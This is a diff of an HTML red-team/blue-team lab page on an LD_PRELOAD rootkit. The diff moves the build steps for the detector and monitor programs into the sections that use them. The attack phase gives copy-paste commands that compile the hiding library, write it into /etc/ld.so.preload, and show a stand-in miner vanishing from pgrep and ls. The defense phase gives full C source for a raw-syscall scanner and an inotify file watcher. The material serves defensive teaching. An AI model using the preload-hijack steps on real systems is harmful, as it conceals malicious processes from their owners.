@@ -91,13 +91,11 @@
             <div class="step-num">1</div>
             <div>
               <h3>Build the lab</h3>
-              <div class="prose"><p>Four small C files. The library (<strong>hide.c</strong>) is the rootkit. The miner (<strong>miner.c</strong>) is a harmless stand-in payload. The scanner (<strong>deepscan.c</strong>) is the detector. The watcher (<strong>watch.c</strong>) is the monitor.</p></div>
+              <div class="prose"><p>Two small C files for the attack: the library (<strong>hide.c</strong>), which is the rootkit, and the miner (<strong>miner.c</strong>), a harmless stand-in payload. The detector and the monitor are built in the sections that use them.</p></div>
               <div class="codeblock codeblock-scrollhint">
-                <div class="codeblock-bar"><span class="mlabel">bash</span><button class="copy-btn" data-copy="gcc -shared -fPIC -O2 -o libghost.so hide.c -ldl&#10;gcc -O2 -o ghost-miner miner.c&#10;gcc -O2 -o deepscan deepscan.c&#10;gcc -O2 -o watch watch.c"><span data-label>COPY</span></button></div>
+                <div class="codeblock-bar"><span class="mlabel">bash</span><button class="copy-btn" data-copy="gcc -shared -fPIC -O2 -o libghost.so hide.c -ldl&#10;gcc -O2 -o ghost-miner miner.c"><span data-label>COPY</span></button></div>
                 <pre>$ gcc -shared -fPIC -O2 -o libghost.so hide.c -ldl
-$ gcc -O2 -o ghost-miner miner.c
-$ gcc -O2 -o deepscan deepscan.c
-$ gcc -O2 -o watch watch.c</pre>
+$ gcc -O2 -o ghost-miner miner.c</pre>
               </div>
             </div>
           </div>
@@ -205,12 +203,76 @@ int main(void) {
               </div>
             </div>
           </div>
+          </section>
+
+        <section class="phase" id="phase-red">
+          <div class="phase-head"><span class="phase-num">03</span><h2>Phase Red: install the lie</h2><span class="phase-tag red">ATTACK</span></div>
+          <p class="lede">The attack has four moves: build the library, launch a visible payload, register the library system-wide, and confirm the payload is gone from every normal tool while still running. Watch the full sequence, then reproduce it.</p>
+          <figure class="recording reveal">
+            <div class="recording-bar">
+              <span class="rec-dot" aria-hidden="true"></span>
+              <span class="mlabel">Real screen recording</span>
+              <span class="dur">00:19</span>
+            </div>
+            <video controls playsinline preload="metadata" poster="../../assets/vid/rootkit-red.jpg" aria-label="Screen recording: ROOTKIT RED, operator@lab">
+              <source src="../../assets/vid/rootkit-red.mp4" type="video/mp4">
+            </video>
+            <figcaption class="recording-cap"><strong>What you are watching:</strong> Build the library, launch ghost-miner (visible in pgrep), install /etc/ld.so.preload, and watch the process and the lab directory vanish from ordinary tools. Every command below is copy-pasteable.</figcaption>
+          </figure>
           <div class="step">
-            <div class="step-num">4</div>
+            <div class="step-num">1</div>
             <div>
-              <h3>The detector: deepscan.c</h3>
-              <div class="prose"><p>This is the second observation path. Instead of libc readdir, it calls <strong>getdents64</strong> directly with <strong>syscall()</strong>, bypassing any hooked wrapper. Any PID it finds whose comm contains ghost gets flagged. The comparison is the detection.</p></div>
+              <h3>Launch the payload, prove it is visible</h3>
+              <div class="prose"><p>Launch first and prove visibility. Without the before state, the after state proves nothing.</p></div>
               <div class="codeblock codeblock-scrollhint">
+                <div class="codeblock-bar"><span class="mlabel">bash</span><button class="copy-btn" data-copy="setsid ./ghost-miner &lt;/dev/null &gt;/dev/null 2&gt;&amp;1 &amp;&#10;pgrep -a ghost-miner"><span data-label>COPY</span></button></div>
+                <pre>$ setsid ./ghost-miner &lt;/dev/null &gt;/dev/null 2&gt;&amp;1 &amp;
+$ pgrep -a ghost-miner</pre>
+              </div>
+              <div class="prose"><p><strong>pgrep</strong> prints the PID and the name. The process exists and every tool agrees.</p></div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">2</div>
+            <div>
+              <h3>Install the hook, confirm the vanish</h3>
+              <div class="prose"><p>One line into /etc/ld.so.preload, and the dynamic loader injects the library into every subsequently launched process.</p></div>
+              <div class="codeblock codeblock-scrollhint">
+                <div class="codeblock-bar"><span class="mlabel">bash</span><button class="copy-btn" data-copy="echo /tmp/ghost-ops/libghost.so &gt; /etc/ld.so.preload&#10;cat /etc/ld.so.preload&#10;pgrep -a ghost-miner || echo &quot;no such process&quot;&#10;ls /tmp | grep ghost || echo &quot;ghost-ops is not listed&quot;"><span data-label>COPY</span></button></div>
+                <pre>$ echo /tmp/ghost-ops/libghost.so &gt; /etc/ld.so.preload
+$ cat /etc/ld.so.preload
+/tmp/ghost-ops/libghost.so
+$ pgrep -a ghost-miner || echo "no such process"
+no such process
+$ ls /tmp | grep ghost || echo "ghost-ops is not listed"
+ghost-ops is not listed</pre>
+              </div>
+              <div class="prose"><p>Note what happened precisely. <strong>cat</strong> still reads the preload file fine, because the filter only hides names containing <strong>ghost</strong> in directory listings, not file contents. But <strong>pgrep</strong> finds no process and <strong>ls</strong> skips the lab directory. The miner is still running; every newly launched tool simply cannot see it.</p></div>
+              <div class="verdict red">
+                <span class="mlabel">Stealth confirmed</span>
+                <p>One line in a loader config file removes a running process from <strong>ps</strong>, <strong>pgrep</strong>, and directory listings, with no kernel module, no patched binary, no elevated process of its own. The tools are not broken; they are faithfully reporting a censored view.</p>
+              </div>
+            </div>
+          </div>
+        </section>
+
+        <section class="phase" id="phase-blue">
+          <div class="phase-head"><span class="phase-num">04</span><h2>Phase Blue: a second pair of eyes</h2><span class="phase-tag blue">DEFENSE</span></div>
+          <p class="lede">Rerunning ps with different flags is not an independent check. Detection here is a second observation path that does not share the compromised layer.</p>
+          <div class="prose">
+            <p>Here is the trap most defenders walk into: <strong>ps aux</strong>, <strong>pgrep</strong>, <strong>top</strong>, and <strong>ls /proc</strong> all enumerate through the same hooked <strong>readdir</strong>. Asking the same compromised layer twice is one observation, not two.</p>
+            <p>The fix is a second observation path that does not share the trust dependency. <strong>deepscan</strong> calls <strong>getdents64</strong> directly, so the hooked wrapper never runs. Compare the two views; the difference is the detection.</p>
+          </div>
+          <div class="step">
+            <div class="step-num">1</div>
+            <div>
+              <h3>Build the second pair of eyes</h3>
+              <div class="prose"><p>The detector is built here because this is where it is used. Instead of libc readdir, it calls <strong>getdents64</strong> directly with <strong>syscall()</strong>, bypassing any hooked wrapper. Any PID it finds whose comm contains ghost gets flagged. The comparison is the detection.</p></div>
+              <div class="codeblock codeblock-scrollhint">
+                <div class="codeblock-bar"><span class="mlabel">bash</span><button class="copy-btn" data-copy="gcc -O2 -o deepscan deepscan.c"><span data-label>COPY</span></button></div>
+                <pre>$ gcc -O2 -o deepscan deepscan.c</pre>
+              </div>
+<div class="codeblock codeblock-scrollhint">
                 <div class="codeblock-bar"><span class="mlabel">c: deepscan.c</span><button class="copy-btn" data-copy="/* deepscan.c - GH-002 lab tool: the detector.&#10; * Lists /proc with the raw getdents64 SYSCALL, bypassing libc entirely,&#10; * so an LD_PRELOAD hook on readdir cannot blind it. Reports any process&#10; * whose comm contains &quot;ghost&quot;: the ones ps, pgrep and top cannot see.&#10; * Compile: gcc -O2 -o deepscan deepscan.c   (no special flags needed) */&#10;#define _GNU_SOURCE&#10;#include &lt;fcntl.h&gt;&#10;#include &lt;stdio.h&gt;&#10;#include &lt;string.h&gt;&#10;#include &lt;sys/syscall.h&gt;&#10;#include &lt;unistd.h&gt;&#10;#include &lt;stdlib.h&gt;&#10;&#10;struct linux_dirent64 {&#10;    unsigned long d_ino;&#10;    long d_off;&#10;    unsigned short d_reclen;&#10;    unsigned char d_type;&#10;    char d_name[];&#10;};&#10;&#10;int main(void) {&#10;    int fd = open(&quot;/proc&quot;, O_RDONLY | O_DIRECTORY);&#10;    if (fd &lt; 0) { perror(&quot;open /proc&quot;); return 1; }&#10;    char buf[8192];&#10;    int found = 0;&#10;    for (;;) {&#10;        long n = syscall(SYS_getdents64, fd, buf, sizeof buf);&#10;        if (n &lt;= 0) break;&#10;        long off = 0;&#10;        while (off &lt; n) {&#10;            struct linux_dirent64 *d = (struct linux_dirent64 *)(buf + off);&#10;            char *end;&#10;            strtol(d-&gt;d_name, &amp;end, 10);&#10;            if (*end == &#x27;\0&#x27;) {                       /* numeric: a PID */&#10;                char path[64], comm[256];&#10;                snprintf(path, sizeof path, &quot;/proc/%s/comm&quot;, d-&gt;d_name);&#10;                int cfd = open(path, O_RDONLY);       /* plain read: unhooked */&#10;                if (cfd &gt;= 0) {&#10;                    ssize_t r = read(cfd, comm, sizeof comm - 1);&#10;                    if (r &gt; 0) {&#10;                        comm[r] = &#x27;\0&#x27;;&#10;                        if (strstr(comm, &quot;ghost&quot;)) {&#10;                            comm[strcspn(comm, &quot;\n&quot;)] = &#x27;\0&#x27;;&#10;                            printf(&quot;HIDDEN PID %-8s comm=%s  (invisible to ps, pgrep, top)\n&quot;,&#10;                                   d-&gt;d_name, comm);&#10;                            found++;&#10;                        }&#10;                    }&#10;                    close(cfd);&#10;                }&#10;            }&#10;            off += d-&gt;d_reclen;&#10;        }&#10;    }&#10;    close(fd);&#10;    if (!found) printf(&quot;no hidden processes found\n&quot;);&#10;    return 0;&#10;}&#10;"><span data-label>COPY</span></button></div>
                 <pre>/* deepscan.c - GH-002 lab tool: the detector.
  * Lists /proc with the raw getdents64 SYSCALL, bypassing libc entirely,
@@ -275,114 +337,6 @@ int main(void) {
               </div>
             </div>
           </div>
-          <div class="step">
-            <div class="step-num">5</div>
-            <div>
-              <h3>The monitor: watch.c</h3>
-              <div class="prose"><p>A minimal inotify watcher: it prints a timestamped <strong>MODIFY</strong> line the moment the watched file changes. Pointed at /etc/ld.so.preload, it is the tripwire for this exact install route. It uses the kernel inotify API directly, so no extra packages are needed.</p></div>
-              <div class="codeblock codeblock-scrollhint">
-                <div class="codeblock-bar"><span class="mlabel">c: watch.c</span><button class="copy-btn" data-copy="/* watch.c - GH-002 lab tool: minimal inotify watcher.&#10; * Prints timestamped events for a watched file. Same kernel API inotifywait uses,&#10; * no package install needed. Compile: gcc -O2 -o watch watch.c */&#10;#include &lt;stdio.h&gt;&#10;#include &lt;stdlib.h&gt;&#10;#include &lt;string.h&gt;&#10;#include &lt;time.h&gt;&#10;#include &lt;unistd.h&gt;&#10;#include &lt;sys/inotify.h&gt;&#10;&#10;int main(int argc, char **argv) {&#10;    if (argc &lt; 2) { fprintf(stderr, &quot;usage: %s &lt;file&gt;\n&quot;, argv[0]); return 1; }&#10;    int fd = inotify_init1(0);&#10;    if (fd &lt; 0) { perror(&quot;inotify_init1&quot;); return 1; }&#10;    int wd = inotify_add_watch(fd, argv[1], IN_MODIFY | IN_ATTRIB | IN_CREATE | IN_DELETE_SELF);&#10;    if (wd &lt; 0) { perror(&quot;inotify_add_watch&quot;); return 1; }&#10;    printf(&quot;watching %s ...\n&quot;, argv[1]);&#10;    fflush(stdout);&#10;    char buf[4096];&#10;    for (;;) {&#10;        ssize_t n = read(fd, buf, sizeof buf);&#10;        if (n &lt;= 0) break;&#10;        time_t now = time(NULL);&#10;        char t[32];&#10;        strftime(t, sizeof t, &quot;%H:%M:%S&quot;, localtime(&amp;now));&#10;        for (char *p = buf; p &lt; buf + n; ) {&#10;            struct inotify_event *e = (struct inotify_event *)p;&#10;            const char *what = (e-&gt;mask &amp; IN_MODIFY) ? &quot;MODIFY&quot; :&#10;                               (e-&gt;mask &amp; IN_ATTRIB) ? &quot;ATTRIB&quot; :&#10;                               (e-&gt;mask &amp; IN_CREATE) ? &quot;CREATE&quot; : &quot;OTHER&quot;;&#10;            printf(&quot;%s  %s  %s\n&quot;, t, argv[1], what);&#10;            fflush(stdout);&#10;            p += sizeof(struct inotify_event) + e-&gt;len;&#10;        }&#10;    }&#10;    return 0;&#10;}&#10;"><span data-label>COPY</span></button></div>
-                <pre>/* watch.c - GH-002 lab tool: minimal inotify watcher.
- * Prints timestamped events for a watched file. Same kernel API inotifywait uses,
- * no package install needed. Compile: gcc -O2 -o watch watch.c */
-#include &lt;stdio.h&gt;
-#include &lt;stdlib.h&gt;
-#include &lt;string.h&gt;
-#include &lt;time.h&gt;
-#include &lt;unistd.h&gt;
-#include &lt;sys/inotify.h&gt;
-
-int main(int argc, char **argv) {
-    if (argc &lt; 2) { fprintf(stderr, &quot;usage: %s &lt;file&gt;\n&quot;, argv[0]); return 1; }
-    int fd = inotify_init1(0);
-    if (fd &lt; 0) { perror(&quot;inotify_init1&quot;); return 1; }
-    int wd = inotify_add_watch(fd, argv[1], IN_MODIFY | IN_ATTRIB | IN_CREATE | IN_DELETE_SELF);
-    if (wd &lt; 0) { perror(&quot;inotify_add_watch&quot;); return 1; }
-    printf(&quot;watching %s ...\n&quot;, argv[1]);
-    fflush(stdout);
-    char buf[4096];
-    for (;;) {
-        ssize_t n = read(fd, buf, sizeof buf);
-        if (n &lt;= 0) break;
-        time_t now = time(NULL);
-        char t[32];
-        strftime(t, sizeof t, &quot;%H:%M:%S&quot;, localtime(&amp;now));
-        for (char *p = buf; p &lt; buf + n; ) {
-            struct inotify_event *e = (struct inotify_event *)p;
-            const char *what = (e-&gt;mask &amp; IN_MODIFY) ? &quot;MODIFY&quot; :
-                               (e-&gt;mask &amp; IN_ATTRIB) ? &quot;ATTRIB&quot; :
-                               (e-&gt;mask &amp; IN_CREATE) ? &quot;CREATE&quot; : &quot;OTHER&quot;;
-            printf(&quot;%s  %s  %s\n&quot;, t, argv[1], what);
-            fflush(stdout);
-            p += sizeof(struct inotify_event) + e-&gt;len;
-        }
-    }
-    return 0;
-}
-</pre>
-              </div>
-            </div>
-          </div>
-        </section>
-
-        <section class="phase" id="phase-red">
-          <div class="phase-head"><span class="phase-num">03</span><h2>Phase Red: install the lie</h2><span class="phase-tag red">ATTACK</span></div>
-          <p class="lede">The attack has four moves: build the library, launch a visible payload, register the library system-wide, and confirm the payload is gone from every normal tool while still running. Watch the full sequence, then reproduce it.</p>
-          <figure class="recording reveal">
-            <div class="recording-bar">
-              <span class="rec-dot" aria-hidden="true"></span>
-              <span class="mlabel">Real screen recording</span>
-              <span class="dur">00:19</span>
-            </div>
-            <video controls playsinline preload="metadata" poster="../../assets/vid/rootkit-red.jpg" aria-label="Screen recording: ROOTKIT RED, operator@lab">
-              <source src="../../assets/vid/rootkit-red.mp4" type="video/mp4">
-            </video>
-            <figcaption class="recording-cap"><strong>What you are watching:</strong> Build the library, launch ghost-miner (visible in pgrep), install /etc/ld.so.preload, and watch the process and the lab directory vanish from ordinary tools. Every command below is copy-pasteable.</figcaption>
-          </figure>
-          <div class="step">
-            <div class="step-num">1</div>
-            <div>
-              <h3>Launch the payload, prove it is visible</h3>
-              <div class="prose"><p>Launch first and prove visibility. Without the before state, the after state proves nothing.</p></div>
-              <div class="codeblock codeblock-scrollhint">
-                <div class="codeblock-bar"><span class="mlabel">bash</span><button class="copy-btn" data-copy="setsid ./ghost-miner &lt;/dev/null &gt;/dev/null 2&gt;&amp;1 &amp;&#10;pgrep -a ghost-miner"><span data-label>COPY</span></button></div>
-                <pre>$ setsid ./ghost-miner &lt;/dev/null &gt;/dev/null 2&gt;&amp;1 &amp;
-$ pgrep -a ghost-miner</pre>
-              </div>
-              <div class="prose"><p><strong>pgrep</strong> prints the PID and the name. The process exists and every tool agrees.</p></div>
-            </div>
-          </div>
-          <div class="step">
-            <div class="step-num">2</div>
-            <div>
-              <h3>Install the hook, confirm the vanish</h3>
-              <div class="prose"><p>One line into /etc/ld.so.preload, and the dynamic loader injects the library into every subsequently launched process.</p></div>
-              <div class="codeblock codeblock-scrollhint">
-                <div class="codeblock-bar"><span class="mlabel">bash</span><button class="copy-btn" data-copy="echo /tmp/ghost-ops/libghost.so &gt; /etc/ld.so.preload&#10;cat /etc/ld.so.preload&#10;pgrep -a ghost-miner || echo &quot;no such process&quot;&#10;ls /tmp | grep ghost || echo &quot;ghost-ops is not listed&quot;"><span data-label>COPY</span></button></div>
-                <pre>$ echo /tmp/ghost-ops/libghost.so &gt; /etc/ld.so.preload
-$ cat /etc/ld.so.preload
-/tmp/ghost-ops/libghost.so
-$ pgrep -a ghost-miner || echo "no such process"
-no such process
-$ ls /tmp | grep ghost || echo "ghost-ops is not listed"
-ghost-ops is not listed</pre>
-              </div>
-              <div class="prose"><p>Note what happened precisely. <strong>cat</strong> still reads the preload file fine, because the filter only hides names containing <strong>ghost</strong> in directory listings, not file contents. But <strong>pgrep</strong> finds no process and <strong>ls</strong> skips the lab directory. The miner is still running; every newly launched tool simply cannot see it.</p></div>
-              <div class="verdict red">
-                <span class="mlabel">Stealth confirmed</span>
-                <p>One line in a loader config file removes a running process from <strong>ps</strong>, <strong>pgrep</strong>, and directory listings, with no kernel module, no patched binary, no elevated process of its own. The tools are not broken; they are faithfully reporting a censored view.</p>
-              </div>
-            </div>
-          </div>
-        </section>
-
-        <section class="phase" id="phase-blue">
-          <div class="phase-head"><span class="phase-num">04</span><h2>Phase Blue: a second pair of eyes</h2><span class="phase-tag blue">DEFENSE</span></div>
-          <p class="lede">Rerunning ps with different flags is not an independent check. Detection here is a second observation path that does not share the compromised layer.</p>
-          <div class="prose">
-            <p>Here is the trap most defenders walk into: <strong>ps aux</strong>, <strong>pgrep</strong>, <strong>top</strong>, and <strong>ls /proc</strong> all enumerate through the same hooked <strong>readdir</strong>. Asking the same compromised layer twice is one observation, not two.</p>
-            <p>The fix is a second observation path that does not share the trust dependency. <strong>deepscan</strong> calls <strong>getdents64</strong> directly, so the hooked wrapper never runs. Compare the two views; the difference is the detection.</p>
-          </div>
           <figure class="recording reveal">
             <div class="recording-bar">
               <span class="rec-dot blue" aria-hidden="true"></span>
@@ -395,7 +349,7 @@ ghost-ops is not listed</pre>
             <figcaption class="recording-cap"><strong>What you are watching:</strong> Ordinary tools report nothing. The raw-syscall scan finds the hidden PID. Direct /proc inspection and the preload file confirm the mechanism. Every command below is copy-pasteable.</figcaption>
           </figure>
           <div class="step">
-            <div class="step-num">1</div>
+            <div class="step-num">2</div>
             <div>
               <h3>Compare the two views</h3>
               <div class="codeblock codeblock-scrollhint">
@@ -409,7 +363,7 @@ HIDDEN PID 4120     comm=ghost-miner  (invisible to ps, pgrep, top)</pre>
             </div>
           </div>
           <div class="step">
-            <div class="step-num">2</div>
+            <div class="step-num">3</div>
             <div>
               <h3>Confirm directly, find the hook</h3>
               <div class="prose"><p><strong>/proc/&lt;pid&gt;/cmdline</strong> is read as file contents, not a directory listing, so the <strong>readdir</strong> hook does not filter it. A direct <strong>ps -p &lt;pid&gt;</strong> is worth trying too, and worth knowing the limit of: on this build it printed only its heading, because even the direct lookup path consults the same enumeration.</p></div>
@@ -455,6 +409,52 @@ views agree: nothing hidden</pre>
             <div>
               <h3>Monitor: trip the install route</h3>
               <div class="prose"><p>The attack needs one file write. A watcher on <strong>/etc/ld.so.preload</strong> turns that write into an alert the moment it happens. D3FEND names this <a href="https://d3fend.mitre.org/technique/d3f:FileIntegrityMonitoring/" rel="noopener">File Integrity Monitoring (D3-FIM)</a>: detecting suspicious changes to files, and <a href="https://d3fend.mitre.org/technique/d3f:SystemFileAnalysis/" rel="noopener">System File Analysis (D3-SFA)</a>: monitoring system files for tampering. The lab version below is a minimal D3-FIM for one file; production versions cover the whole set of loader and library paths.</p></div>
+              <div class="prose"><p>Build the monitor here, where it is used. It uses the kernel inotify API directly, so no extra packages are needed.</p></div>
+              <div class="codeblock codeblock-scrollhint">
+                <div class="codeblock-bar"><span class="mlabel">bash</span><button class="copy-btn" data-copy="gcc -O2 -o watch watch.c"><span data-label>COPY</span></button></div>
+                <pre>$ gcc -O2 -o watch watch.c</pre>
+              </div>
+<div class="codeblock codeblock-scrollhint">
+                <div class="codeblock-bar"><span class="mlabel">c: watch.c</span><button class="copy-btn" data-copy="/* watch.c - GH-002 lab tool: minimal inotify watcher.&#10; * Prints timestamped events for a watched file. Same kernel API inotifywait uses,&#10; * no package install needed. Compile: gcc -O2 -o watch watch.c */&#10;#include &lt;stdio.h&gt;&#10;#include &lt;stdlib.h&gt;&#10;#include &lt;string.h&gt;&#10;#include &lt;time.h&gt;&#10;#include &lt;unistd.h&gt;&#10;#include &lt;sys/inotify.h&gt;&#10;&#10;int main(int argc, char **argv) {&#10;    if (argc &lt; 2) { fprintf(stderr, &quot;usage: %s &lt;file&gt;\n&quot;, argv[0]); return 1; }&#10;    int fd = inotify_init1(0);&#10;    if (fd &lt; 0) { perror(&quot;inotify_init1&quot;); return 1; }&#10;    int wd = inotify_add_watch(fd, argv[1], IN_MODIFY | IN_ATTRIB | IN_CREATE | IN_DELETE_SELF);&#10;    if (wd &lt; 0) { perror(&quot;inotify_add_watch&quot;); return 1; }&#10;    printf(&quot;watching %s ...\n&quot;, argv[1]);&#10;    fflush(stdout);&#10;    char buf[4096];&#10;    for (;;) {&#10;        ssize_t n = read(fd, buf, sizeof buf);&#10;        if (n &lt;= 0) break;&#10;        time_t now = time(NULL);&#10;        char t[32];&#10;        strftime(t, sizeof t, &quot;%H:%M:%S&quot;, localtime(&amp;now));&#10;        for (char *p = buf; p &lt; buf + n; ) {&#10;            struct inotify_event *e = (struct inotify_event *)p;&#10;            const char *what = (e-&gt;mask &amp; IN_MODIFY) ? &quot;MODIFY&quot; :&#10;                               (e-&gt;mask &amp; IN_ATTRIB) ? &quot;ATTRIB&quot; :&#10;                               (e-&gt;mask &amp; IN_CREATE) ? &quot;CREATE&quot; : &quot;OTHER&quot;;&#10;            printf(&quot;%s  %s  %s\n&quot;, t, argv[1], what);&#10;            fflush(stdout);&#10;            p += sizeof(struct inotify_event) + e-&gt;len;&#10;        }&#10;    }&#10;    return 0;&#10;}&#10;"><span data-label>COPY</span></button></div>
+                <pre>/* watch.c - GH-002 lab tool: minimal inotify watcher.
+ * Prints timestamped events for a watched file. Same kernel API inotifywait uses,
+ * no package install needed. Compile: gcc -O2 -o watch watch.c */
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;time.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/inotify.h&gt;
+
+int main(int argc, char **argv) {
+    if (argc &lt; 2) { fprintf(stderr, &quot;usage: %s &lt;file&gt;\n&quot;, argv[0]); return 1; }
+    int fd = inotify_init1(0);
+    if (fd &lt; 0) { perror(&quot;inotify_init1&quot;); return 1; }
+    int wd = inotify_add_watch(fd, argv[1], IN_MODIFY | IN_ATTRIB | IN_CREATE | IN_DELETE_SELF);
+    if (wd &lt; 0) { perror(&quot;inotify_add_watch&quot;); return 1; }
+    printf(&quot;watching %s ...\n&quot;, argv[1]);
+    fflush(stdout);
+    char buf[4096];
+    for (;;) {
+        ssize_t n = read(fd, buf, sizeof buf);
+        if (n &lt;= 0) break;
+        time_t now = time(NULL);
+        char t[32];
+        strftime(t, sizeof t, &quot;%H:%M:%S&quot;, localtime(&amp;now));
+        for (char *p = buf; p &lt; buf + n; ) {
+            struct inotify_event *e = (struct inotify_event *)p;
+            const char *what = (e-&gt;mask &amp; IN_MODIFY) ? &quot;MODIFY&quot; :
+                               (e-&gt;mask &amp; IN_ATTRIB) ? &quot;ATTRIB&quot; :
+                               (e-&gt;mask &amp; IN_CREATE) ? &quot;CREATE&quot; : &quot;OTHER&quot;;
+            printf(&quot;%s  %s  %s\n&quot;, t, argv[1], what);
+            fflush(stdout);
+            p += sizeof(struct inotify_event) + e-&gt;len;
+        }
+    }
+    return 0;
+}
+</pre>
+              </div>
               <figure class="recording reveal">
                 <div class="recording-bar">
                   <span class="rec-dot blue" aria-hidden="true"></span>
